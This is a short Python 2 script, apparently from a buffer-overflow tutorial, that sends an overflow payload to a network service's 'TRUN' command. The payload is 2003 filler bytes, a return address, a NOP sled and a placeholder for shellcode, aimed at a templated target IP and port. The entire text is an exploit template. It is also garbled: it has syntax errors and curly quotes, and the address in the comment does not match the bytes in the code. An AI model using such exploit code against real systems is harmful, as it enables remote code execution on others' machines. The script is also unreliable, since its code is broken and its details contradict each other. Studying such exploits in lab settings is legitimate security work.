#!/usr/bin/python
import sys. socket

#The code we are testing first in this example is ‘626011af’

overflow = (paste all the characters we copied *enclosed within parentheses*)

shellcode = “A” * 2003 + “\xaf\x11\x50\x62” + “\x90” * 32 + overflow

try:

    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
    s.connect((‘{target ip}’ , ‘{target port}’ ))

    s.send((‘ TRUN /.:/ ‘ + shellcode))
    s.close

except:
    print “Error connecting to server”
    sys.exit()
